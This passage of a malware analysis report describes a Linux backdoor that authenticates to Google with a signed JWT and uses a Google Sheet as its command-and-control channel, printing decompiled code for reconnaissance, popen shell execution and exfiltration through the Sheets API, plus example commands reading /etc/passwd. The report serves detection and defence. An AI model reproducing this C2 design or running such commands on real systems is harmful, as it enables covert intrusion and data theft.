+<p class="mb-3">To authenticate with Google APIs without user interaction, the malware constructs a JSON Web Token (JWT). It sets the algorithm to RS256 and signs the token using the RSA private key decrypted in the previous step. It then sends a POST request to <code>oauth2.googleapis.com/token</code> to exchange the signed assertion for an OAuth2 Bearer token.</p>
+
+<strong>Code Evidence</strong> (<code>fcn.00408960</code> @ <code>0x408960</code>):
+<pre><code>// Construct JWT Header
+snprintf (r13, 0x400, &quot;{\&quot;alg\&quot;:\&quot;RS256\&quot;,\&quot;kid\&quot;:\&quot;%s\&quot;,\&quot;typ\&quot;:\&quot;JWT\&quot;}&quot;, *(0x00763d08));
+// Construct JWT Payload with scopes
+snprintf(rbx, 0x1000, &quot;{\&quot;aud\&quot;:\&quot;https://oauth2.googleapis.com/token\&quot;,\&quot;exp\&quot;:%s,\&quot;iat\&quot;:%s,\&quot;iss\&quot;:\&quot;%s\&quot;,\&quot;sub\&quot;:\&quot;%s\&quot;,\&quot;scope\&quot;:\&quot;https://www.googleapis.com/auth/spreadsheets.readonly ...&quot;);
+// Send Token Request
+snprintf (r13, rbx, &quot;POST %s HTTP/1.1\r\nHost: oauth2.googleapis.com\r\n... \r\n\r\n%s&quot;, &quot;/token&quot;);
+rax = fcn_00407940 (&quot;oauth2.googleapis.com&quot;, r13, eax);
+</code></pre>
+
+<strong>System Reconnaissance</strong>
+<p class="mb-3">Before polling for commands, the malware gathers a profile of the infected machine. It collects the hostname, network interface IPs, OS/kernel version, user ID/name, and current working directory.</p>
+
+<strong>Code Evidence</strong> (<code>fcn.00408b20</code> @ <code>0x408b20</code>):
+<pre><code>// Gather Hostname
+eax = gethostname ();
+// Gather Network Interfaces
+eax = getifaddrs ();
+// ...
+// Gather OS Info
+eax = uname ();
+// Gather User Info
+eax = getuid ();
+rax = getpwuid ();
+// Gather CWD
+rax = getcwd ();
+</code></pre>
+
+<strong>Command Execution &amp; C2 Loop</strong>
+<p class="mb-3">The <code>main</code> function operates an infinite loop. It requests an OAuth token, checks for new commands in the Google Sheet, parses them, executes actions, and clears the commands from the sheet. The command format is dash-separated (e.g., <code>S-C-R</code>).</p>
+
+<strong>Code Evidence</strong> (<code>main</code> @ <code>0x4095c0</code>):
+<pre><code>do {
+    // Check for commands
+    rax = fcn_00409300 (0x4fb549);
+    if (rax == 0) { goto label_11; }
+    
+    // Parse command string by &#x27;-&#x27;
+    rax = strchr (rbx, 0x2d); // Split
+    
+    // Handle &quot;S-C-R&quot; (Shell Command Run?)
+    eax = strcasecmp (rbx, 0x5124e4);
+    if (eax == 0) {
+        // Execute command
+        rax = fcn_00407310 (*((rsp + 0x778))); // This calls popen
+    }
+} while (1);
+</code></pre></div>
+        </div>
+
+        <!-- Functions Analysis -->
+        <div>
+            <h2 class="section-header">5. Functions Analysis</h2>
+            <div class="text-sm text-gray-600 mb-4 italic border-l-2 border-gray-300 pl-3">Key functions identified during static analysis, including decompiled pseudocode and behavioral descriptions.</div>
+            <div class="markdown-content"><strong>[fcn.00408190] @ [0x408190]</strong>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Purpose</strong>: Decrypts the malware&#x27;s configuration (Spreadsheet ID, Credentials) using AES-128-CBC.</li>
+<li class="mb-2"><strong>Malicious/Interesting</strong>: Yes — Extracts the C2 keys required for operation.</li>
+<li class="mb-2"><strong>Key Code Evidence</strong>:</li>
+</ul>
+<pre><code>rax = fread (rbp, 1, 0x10, rax); // Read 16 byte key from file
+AES_cbc_encrypt (); // Decrypt hardcoded config strings
+</code></pre>
+
+<strong>[fcn.00408960] @ [0x408960]</strong>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Purpose</strong>: Generates a signed JWT and exchanges it for an OAuth2 access token from Google.</li>
+<li class="mb-2"><strong>Malicious/Interesting</strong>: Yes — Enables C2 authentication using stolen/compromised Google Service Account credentials.</li>
+<li class="mb-2"><strong>Key Code Evidence</strong>:</li>
+</ul>
+<pre><code>snprintf(rbx, 0x1000, &quot;{\&quot;aud\&quot;:\&quot;https://oauth2.googleapis.com/token\&quot;...&quot;); // JWT Payload
+snprintf (r13, rbx, &quot;POST %s HTTP/1.1\r\nHost: oauth2.googleapis.com...&quot;, &quot;/token&quot;); // Auth Request
+</code></pre>
+
+<strong>[main] @ [0x4095c0]</strong>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Purpose</strong>: Main malware loop. Handles initialization, polling for commands, parsing input, and dispatching to execution/exfiltration functions.</li>
+<li class="mb-2"><strong>Malicious/Interesting</strong>: Yes — Orchestrates the C2 behavior.</li>
+<li class="mb-2"><strong>Key Code Evidence</strong>:</li>
+</ul>
+<pre><code>// Command Parsing Loop
+rax = strchr (rbx, 0x2d); // Split by &#x27;-&#x27;
+if (strcasecmp (rbx, 0x5124e4) == 0) { // S-C-R
+    rax = fcn_00407310 (...); // Execute Shell
+}
+</code></pre>
+
+<strong>[fcn.00407310] @ [0x407310]</strong>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Purpose</strong>: Executes a shell command using <code>popen</code> and returns the output.</li>
+<li class="mb-2"><strong>Malicious/Interesting</strong>: Yes — Provides remote code execution capability.</li>
+<li class="mb-2"><strong>Key Code Evidence</strong>:</li>
+</ul>
+<pre><code>rax = popen (rbx, 0x4f6333); // &quot;r&quot;
+// ... loop to read output ...
+pclose (rbp);
+</code></pre>
+
+<strong>[fcn.00408b20] @ [0x408b20]</strong>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Purpose</strong>: Gathers system reconnaissance data (Hostname, IP, User, OS, CWD).</li>
+<li class="mb-2"><strong>Malicious/Interesting</strong>: Yes — Spying on the victim.</li>
+<li class="mb-2"><strong>Key Code Evidence</strong>:</li>
+</ul>
+<pre><code>eax = gethostname ();
+eax = getifaddrs ();
+eax = uname ();
+eax = getpwuid ();
+rax = getcwd ();
+</code></pre>
+
+<strong>[fcn.004094b0] @ [0x4094b0]</strong>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Purpose</strong>: Constructs a Google Sheets API request to clear cells (remove processed commands).</li>
+<li class="mb-2"><strong>Malicious/Interesting</strong>: Yes — Maintains stealth by cleaning up C2 logs.</li>
+<li class="mb-2"><strong>Key Code Evidence</strong>:</li>
+</ul>
+<pre><code>snprintf(rsp, 0x1000, &quot;POST /v4/spreadsheets/%s/values:batchClear HTTP/1.1\r\nHost: sheets.googleapis.com...&quot;, ...);
+</code></pre>
+
+<strong>[fcn.00409110] @ [0x409110]</strong>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Purpose</strong>: Reads values from the Google Sheet to retrieve C2 commands.</li>
+<li class="mb-2"><strong>Malicious/Interesting</strong>: Yes — Receives attacker instructions.</li>
+<li class="mb-2"><strong>Key Code Evidence</strong>:</li>
+</ul>
+<pre><code>snprintf (rdi, 0x800, &quot;GET /v4/spreadsheets/%s/values/%s?valueRenderOption=FORMULA HTTP/1.1\r\nHost: sheets.googleapis.com...&quot;, ...);
+</code></pre>
+
+<strong>[fcn.004093b0] @ [0x4093b0]</strong>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Purpose</strong>: Sends a batch update to the Google Sheet (used to exfiltrate data).</li>
+<li class="mb-2"><strong>Malicious/Interesting</strong>: Yes — Exfiltration mechanism.</li>
+<li class="mb-2"><strong>Key Code Evidence</strong>:</li>
+</ul>
+<pre><code>snprintf (r12, r9 + 0x1000, &quot;POST /v4/spreadsheets/%s/values:batchUpdate HTTP/1.1\r\nHost: sheets.googleapis.com...&quot;, ...);
+</code></pre>
+
+<strong>[fcn.00407940] @ [0x407940]</strong>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Purpose</strong>: Helper function to send HTTP requests over raw sockets (handling SSL/TLS via statically linked OpenSSL).</li>
+<li class="mb-2"><strong>Malicious/Interesting</strong>: No (Standard network utility function, but used maliciously).</li>
+<li class="mb-2"><strong>Key Code Evidence</strong>:</li>
+</ul>
+<pre><code>rax = fcn_00451650 (r14, 0x64, 1, 0x4f4774); // &quot;ssl&quot;
+rax = fcn_00451b00 (r14, r12, ebp); // Connect
+</code></pre></div>
+        </div>
+
+        <!-- Evidence -->
+        <div>
+            <h2 class="section-header">6. Evidence of Malicious Activity</h2>
+            <div><div class="finding-item"><div class="finding-title">Finding 1</div><pre style="margin:6px 0 0 1rem;padding:10px 14px;background:#f8f9fa;border:1px solid #e5e7eb;border-radius:4px;overflow-x:auto;font-family:'Roboto Mono',monospace;font-size:0.8rem;line-height:1.6;color:#374151;white-space:pre-wrap;word-break:break-word;"><code>C2 Communication via Google Sheets - Function: `fcn.004094b0` @ `0x4094b0` - Code: `snprintf(rsp, 0x1000, &quot;POST /v4/spreadsheets/%s/values:batchClear HTTP/1.1\r\nHost: sheets.googleapis.com...`</code></pre></div><div class="finding-item"><div class="finding-title">Finding 2</div><pre style="margin:6px 0 0 1rem;padding:10px 14px;background:#f8f9fa;border:1px solid #e5e7eb;border-radius:4px;overflow-x:auto;font-family:'Roboto Mono',monospace;font-size:0.8rem;line-height:1.6;color:#374151;white-space:pre-wrap;word-break:break-word;"><code>Decryption of Embedded Configuration - Function: `fcn.00408190` @ `0x408190` - Code: `AES_cbc_encrypt();` using file read bytes as key</code></pre></div><div class="finding-item"><div class="finding-title">Finding 3</div><pre style="margin:6px 0 0 1rem;padding:10px 14px;background:#f8f9fa;border:1px solid #e5e7eb;border-radius:4px;overflow-x:auto;font-family:'Roboto Mono',monospace;font-size:0.8rem;line-height:1.6;color:#374151;white-space:pre-wrap;word-break:break-word;"><code>Shell Command Execution - Function: `fcn.00407310` @ `0x407310` - Code: `rax = popen (rbx, 0x4f6333);`</code></pre></div><div class="finding-item"><div class="finding-title">Finding 4</div><pre style="margin:6px 0 0 1rem;padding:10px 14px;background:#f8f9fa;border:1px solid #e5e7eb;border-radius:4px;overflow-x:auto;font-family:'Roboto Mono',monospace;font-size:0.8rem;line-height:1.6;color:#374151;white-space:pre-wrap;word-break:break-word;"><code>System Reconnaissance - Function: `fcn.00408b20` @ `0x408b20` - Code: `eax = getifaddrs(); ... eax = uname();`</code></pre></div><div class="finding-item"><div class="finding-title">Finding 5</div><pre style="margin:6px 0 0 1rem;padding:10px 14px;background:#f8f9fa;border:1px solid #e5e7eb;border-radius:4px;overflow-x:auto;font-family:'Roboto Mono',monospace;font-size:0.8rem;line-height:1.6;color:#374151;white-space:pre-wrap;word-break:break-word;"><code>OAuth Token Theft/Usage - Function: `fcn.00408960` @ `0x408960` - Code: `snprintf(..., &quot;{\&quot;aud\&quot;:\&quot;https://oauth2.googleapis.com/token\&quot;...`</code></pre></div><div class="finding-item"><div class="finding-title">Finding 6</div><pre style="margin:6px 0 0 1rem;padding:10px 14px;background:#f8f9fa;border:1px solid #e5e7eb;border-radius:4px;overflow-x:auto;font-family:'Roboto Mono',monospace;font-size:0.8rem;line-height:1.6;color:#374151;white-space:pre-wrap;word-break:break-word;"><code>Command Parsing Logic - Function: `main` @ `0x4095c0` - Code: `rax = strchr (rbx, 0x2d);` (Splitting commands by dash)</code></pre></div></div>
+        </div>
+
+        <!-- Code Evidence -->
+        <div>
+            <h2 class="section-header">6b. Code Evidence (Suspicious API Calls)</h2>
+            <div class="text-sm text-gray-600 mb-4 italic border-l-2 border-gray-300 pl-3">Exact code locations where suspicious or malicious API calls were found in decompiled functions. Only factual findings from both Ghidra and Radare2.</div>
+            <div><div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.00408190 @ 0x408190 — <span style="color:#fbbf24;">fopen, fread, free, malloc, memset</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>    memset (rsp, 0, 0x1005);
+    rax = fopen (rbx, 0x4f479d);
+    rax = fread (rbp, 1, 0x10, rax);
+        rax = malloc (*((rsp + 0x1140)));
+        memset (rdi, 0, *((rsp + 0x1140)));
+        free (*((rsp + 0x1148)));
+        rax = malloc (*((rsp + 0x1140)));
+        memset (rdi, 0, *((rsp + 0x1140)));
+        free (*((rsp + 0x1148)));
+        rax = malloc (*((rsp + 0x1140)));</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> main @ 0x4095c0 — <span style="color:#fbbf24;">fopen, fread, free, fwrite, malloc, memset, sleep, snprintf, sprintf, strcasecmp, strchr</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>        eax = free (rdi);
+    free (*((rsp + 0x750)));
+        free (rbp);
+        sleep (1);
+    eax = sleep (rsi + 0x12c);
+    rax = strchr (rbx, 0x2d);
+    rax = strchr (r12, 0x2d);
+    rax = strchr (r15, 0x2d);
+    rax = strchr (r13, 0x2d);
+        eax = strcasecmp (rbx, 0x5124e4);</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.00408960 @ 0x408960 — <span style="color:#fbbf24;">free, malloc, memset, snprintf</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>    eax = snprintf (r14, 0x14, 0x509006, rax);
+    eax = snprintf (r12, 0x14, 0x509006, rbx + 0xe10);
+    eax = snprintf (r13, 0x400, &quot;{\&quot;alg\&quot;:\&quot;RS256\&quot;,\&quot;kid\&quot;:\&quot;%s\&quot;,\&quot;typ\&quot;:\&quot;JWT\&quot;}&quot;, *(0x00763d08));
+    snprintf (rbx, 0x1000, &quot;{\&quot;aud\&quot;:\&quot;https://oauth2.googleapis.com/token\&quot;,\&quot;exp\&quot;:%s,\&quot;iat\&quot;:%s,\&quot;iss\&quot;:\&quot;%s\&quot;,\&quot;sub\&quot;:\&quot;%s\&quot;,\&quot;scope\&quot;:\&quot;https://www.googleapis.com/auth/spreadsheets.readonly https://www.googleapis.com/auth/spreadsheets https://www.googleapis.com/auth/drive.file https://www.googleapis.com/auth/drive.readonly https://www.googleapis.com/auth/drive\&quot;}&quot;, r12);
+    rax = malloc (rbx);
+    memset (rdi, 0, rbx);
+    snprintf (r14, rbx, &quot;grant_type=%s&amp;assertion=%s&quot;, rcx);
+    free (r12);
+    free (r13);
+    rax = malloc (rbx);</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.00408b20 @ 0x408b20 — <span style="color:#fbbf24;">getcwd, getenv, gethostname, getifaddrs, getnameinfo, getpwuid, getuid, memset, strftime, uname</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>    memset (rbx, 0, 0x100);
+    memset (r12, 0, 0x800);
+    eax = gethostname ();
+    eax = getifaddrs ();
+    eax = getnameinfo ();
+    eax = uname ();
+    eax = getuid ();
+    rax = getpwuid ();
+    rax = getcwd ();
+    rax = getenv (rdi);</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.00407940 @ 0x407940 — <span style="color:#fbbf24;">free, malloc, memcpy, realloc, sscanf, strstr</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>        rax = realloc (r15, r12 + rbx + 1);
+    memcpy (rdi, r13, rdx);
+    rax = strstr (r15, 0x4f4789);
+    rax = strstr (r15, &quot;Content-Length:&quot;);
+        rax = realloc (r15, rax + rbp + 1);
+        rax = malloc (rbx + 1);
+        rax = realloc (r15, *((rsp + 0x1048)));
+        memcpy (rbx, *((rsp + 0x1050)), *((rsp + 0x1048)));
+        free (*((rsp + 0x1050)));
+        rax = realloc (r15, r12 + 1);</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.004087e0 @ 0x4087e0 — <span style="color:#fbbf24;">free, malloc, realloc, sprintf</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>    rax = malloc (rbp + 0xa);
+    sprintf (rax, &quot;%s.%s&quot;, *((rsp + 0x10)));
+    rax = realloc (r12, rsi);
+    sprintf (rdx + rax + 1, 0x4f47b4, rbx);
+    free (*((rsp + 0x10)));
+    free (r13);
+    free (*((rsp + 0x18)));
+    free (rbx);</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.0043a460 @ 0x43a460 — <span style="color:#fbbf24;">getenv, sscanf, strchr</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>        rax = getenv (&quot;OPENSSL_ia32cap&quot;);
+        eax = sscanf (rbp, &quot;%lli&quot;, rsp + 8);
+        rax = strchr (rbx, 0x3a);</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.004094b0 @ 0x4094b0 — <span style="color:#fbbf24;">free, memcpy, memset, snprintf</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>    memset (rdi, 0, 0x1000);
+    snprintf (rsp, 0x1000, &quot;POST /v4/spreadsheets/%s/values:batchClear HTTP/1.1\r\nHost: sheets.googleapis.com\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Bearer %s\r\nUser-Agent: Directory API Google-API-Java-Client/2.0.0 Google-HTTP-Java-Client/1.42.3 (gzip)\r\nContent-Type: application/json; charset=UTF-8\r\nContent-Encoding: gzip\r\nContent-Length: %zu\r\n\r\n&quot;, *(0x00763d10));
+    memcpy (rbp + rdi, rsi, *((rsp + 0x1000)));
+    free (*((rsp + 0x1008)));
+        free (rax);</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.00407310 @ 0x407310 — <span style="color:#fbbf24;">free, malloc, memset, pclose, popen, realloc</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>    memset (rdi, 0, 0x401);
+    rax = malloc (rax + 0xa);
+    memset (rbx, 0, rax + 0xa);
+    rax = popen (rbx, 0x4f6333);
+    free (rbx);
+        rax = malloc (0x401);
+        rax = realloc (r12, rbx + 1);
+    pclose (rbp);
+    free (r12);</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.00409110 @ 0x409110 — <span style="color:#fbbf24;">free, memset, snprintf, sprintf</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>    memset (rbp, 0, 0x400);
+    sprintf (rbp, 0x504ed2, rdx);
+    eax = memset (rsp, 0, 0x800);
+    snprintf (rdi, 0x800, &quot;GET /v4/spreadsheets/%s/values/%s?valueRenderOption=FORMULA HTTP/1.1\r\nHost: sheets.googleapis.com\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Bearer %s\r\nUser-Agent: Directory API Google-API-Java-Client/2.0.0 Google-HTTP-Java-Client/1.42.3 (gzip)\r\nContent-Type: application/json; charset=UTF-8\r\nContent-Encoding: gzip\r\n\r\n&quot;, *(0x00763d10));
+        free (rbx);</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.00409020 @ 0x409020 — <span style="color:#fbbf24;">free, sscanf</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>        sym.imp.sscanf(iVar1,&quot;%s %s %s&quot;,&amp;uStack_28,&amp;uStack_48,&amp;uStack_68);
+                sym.imp.free();
+            sym.imp.free(iVar1);</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.004093b0 @ 0x4093b0 — <span style="color:#fbbf24;">free, malloc, memcpy, memset, snprintf</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>    free (rbx);
+    rax = malloc (*((rsp + 8)));
+    eax = memset (rdi, 0, *((rsp + 8)));
+    snprintf (r12, r9 + 0x1000, &quot;POST /v4/spreadsheets/%s/values:batchUpdate HTTP/1.1\r\nHost: sheets.googleapis.com\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Bearer %s\r\nUser-Agent: Google-HTTP-Java-Client/1.42.3 (gzip)\r\nContent-Type: application/json; charset=UTF-8\r\nContent-Encoding: gzip\r\nContent-Length: %zu\r\n\r\n&quot;, *(0x00763d10));
+    memcpy (rdi, *((rsp + 0x10)), *((rsp + 8)));
+    free (*((rsp + 0x10)));
+    free (r12);
+        free (rbx);</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.004325a0 @ 0x4325a0 — <span style="color:#fbbf24;">fwrite</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>    fwrite (&quot;dtls1_retransmit_message() failed\n&quot;, 1, 0x22, *(rax));</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.0041f2c0 @ 0x41f2c0 — <span style="color:#fbbf24;">memcpy, memset</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>        memcpy (r12 + 5, *((rbp + 0x248)), r15);
+        memset (r12 + r15 + 6, 0, ebx);</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.00454ff0 @ 0x454ff0 — <span style="color:#fbbf24;">memcpy</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>    memcpy (rax, *(rcx), rdx);
+        al = memcpy (rdi, *(rax), rdx);
+        memcpy (rdi, *(rax), rdx);
+    memcpy (rdi, *(rcx), rdx);
+    memcpy (rdi, *(rax), rdx);
+    memcpy (rdi, *(rax), rdx);
+    memcpy (rdi, *(rbx), rdx);
+    memcpy (rdi, *(rax), rdx);
+    memcpy (rdi, *(rax), rdx);
+        eax = memcpy (rdi, *(rax), rdx);</code></pre></div>
+<div class="decomp-block" style="margin-bottom:16px;border:1px solid #d1d5db;border-radius:4px;overflow:hidden;"><div style="background:#1f2937;color:white;padding:8px 14px;font-family:'Roboto Mono',monospace;font-size:0.82rem;"><strong>[Radare2]</strong> fcn.004f146f @ 0x4f146f — <span style="color:#fbbf24;">memcpy</span></div><pre style="margin:0;padding:12px;background:#f8f9fa;overflow-x:auto;font-size:0.8rem;line-height:1.5;"><code>                memcpy (r8 + rdi, *((rsp + 0x28)), rdx);
+        memcpy (*((rsp + 0x30)), *((rsp + 0x28)), rax);</code></pre></div></div>
+        </div>
+
+        <!-- Operational Flow -->
+        <div>
+            <h2 class="section-header">7. Operational Flow</h2>
+            <div class="markdown-content"><ol class="list-decimal pl-6 mb-4">
+<li class="mb-2"><strong>Initialization</strong>: The malware starts by reading its own path or a provided config file (<code>/proc/self/exe</code>).</li>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2">Evidence: <code>fcn.00408190</code> @ <code>0x408190</code> calls <code>readlink</code>.</li>
+</ul>
+<li class="mb-2"><strong>Setup</strong>: It extracts the AES Key (first 16 bytes of the file) and decrypts the embedded Google Service Account credentials (Client Email, Private Key, Spreadsheet ID).</li>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2">Evidence: <code>fcn.00408190</code> @ <code>0x408190</code> calls <code>AES_cbc_encrypt</code>.</li>
+</ul>
+<li class="mb-2"><strong>Reconnaissance</strong>: It gathers system information (hostname, IP, user, OS) to identify the victim.</li>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2">Evidence: <code>fcn.00408b20</code> @ <code>0x408b20</code>.</li>
+</ul>
+<li class="mb-2"><strong>C2 Registration</strong>: It generates a signed JWT and requests an OAuth2 access token from <code>oauth2.googleapis.com</code>.</li>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2">Evidence: <code>fcn.00408960</code> @ <code>0x408960</code>.</li>
+</ul>
+<li class="mb-2"><strong>Command Loop</strong>:</li>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Polling</strong>: It polls the specific Google Sheet for new data (<code>GET /v4/spreadsheets/...</code>).</li>
+<li class="mb-2"><strong>Processing</strong>: If data is found, it parses the command string (e.g., <code>S-C-R-cmd</code>).</li>
+<li class="mb-2"><strong>Execution</strong>: Based on the command type, it executes shell commands (<code>popen</code>), reads files (<code>fopen</code>), or writes files.</li>
+<li class="mb-2"><strong>Reporting</strong>: It sends the results (shell output, file data) back to the sheet (<code>POST /v4/spreadsheets/.../values:batchUpdate</code>).</li>
+<li class="mb-2"><strong>Cleanup</strong>: It deletes the processed command from the sheet (<code>POST .../values:batchClear</code>).</li>
+<li class="mb-2">Evidence: <code>main</code> @ <code>0x4095c0</code>, <code>fcn.00409110</code>, <code>fcn.004093b0</code>, <code>fcn.004094b0</code>.</li>
+</ul>
+<li class="mb-2"><strong>Persistence</strong>: The binary runs in an infinite loop. Persistence is likely achieved through an external mechanism (e.g., cron job, systemd service) as it does not modify system configuration files within the analyzed code.</li>
+</ol></div>
+        </div>
+
+        <!-- C2 & Networking -->
+        <div>
+            <h2 class="section-header">8. C2 & Networking</h2>
+            <div class="markdown-content"><ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>C2 Servers</strong>:</li>
+<li class="mb-2"><code>oauth2.googleapis.com</code> (Authentication)</li>
+<li class="mb-2"><code>sheets.googleapis.com</code> (Data Exfiltration &amp; Command Retrieval)</li>
+<li class="mb-2">Evidence: Strings @ Global data section.</li>
+<li class="mb-2"><strong>Protocols</strong>: HTTPS (via statically linked OpenSSL).</li>
+<li class="mb-2">Evidence: Imports <code>socket</code>, <code>connect</code> and Exports <code>ssl3_connect</code>, <code>AES_cbc_encrypt</code>.</li>
+<li class="mb-2"><strong>Communication Pattern</strong>:</li>
+</ul>
+<ol class="list-decimal pl-6 mb-4">
+<li class="mb-2">Authenticate via OAuth2 JWT Bearer flow.</li>
+<li class="mb-2">Poll Google Sheet cell <code>a1:z1000</code> for commands.</li>
+<li class="mb-2">Write results to the same sheet.</li>
+<li class="mb-2">Clear cells after processing.</li>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Command Format</strong>: Dash-separated strings.</li>
+<li class="mb-2">Example: <code>S-C-R-whoami</code> (Shell Command Read/Execute)</li>
+<li class="mb-2">Example: <code>S-D-/etc/passwd</code> (Shell Download/Read File)</li>
+<li class="mb-2"><strong>Authentication</strong>: Google Service Account OAuth2 using RS256 signed JWTs.</li>
+<li class="mb-2"><strong>Data Format</strong>: Plaintext or Base64 encoded data within JSON payloads for Google Sheets API.</li>
+</ul>
+</ol></div>
+        </div>
+
+        <!-- Recommendations -->
+        <div>
+            <h2 class="section-header">9. Recommendations</h2>
